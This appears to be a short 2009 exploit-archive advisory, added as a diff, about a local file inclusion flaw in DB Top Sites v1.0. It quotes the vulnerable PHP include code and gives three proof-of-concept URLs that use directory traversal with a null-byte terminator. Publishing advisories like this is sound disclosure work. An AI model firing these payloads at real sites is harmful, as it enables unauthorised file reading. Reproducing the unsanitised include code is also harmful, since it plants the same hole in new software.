@@ -1,0 +1,30 @@
+######################################################################
+[+] DB Top Sites v1.0 (index.php u) Local File Inclusion Vulnerability
+[+] Discovered By SirGod 
+[+] www.mortal-team.org
+#######################################################################
+
+[+] Local File Inclusion
+
+ - Vulnerable code is everywhere
+
+-------------------------------------------------------------------------------------------------------
+if ( $u != "" ) {
+
+if ( file_exists( "./sites/session/$u.session.php" ) ){
+include "./sites/session/$u.session.php";
+include "./sites/$u.php";
+-------------------------------------------------------------------------------------------------------
+
+- PoC's
+
+    http://127.0.0.1/[path]/full.php?u=../../../../../../BOOTSECT.BAK%00
+
+    http://127.0.0.1/[path]/index.php?u=../../../../../../BOOTSECT.BAK%00
+
+    http://127.0.0.1/[path]/contact.php?u=../../../../../../BOOTSECT.BAK%00
+
+
+#######################################################################
+
+# milw0rm.com [2009-06-15]
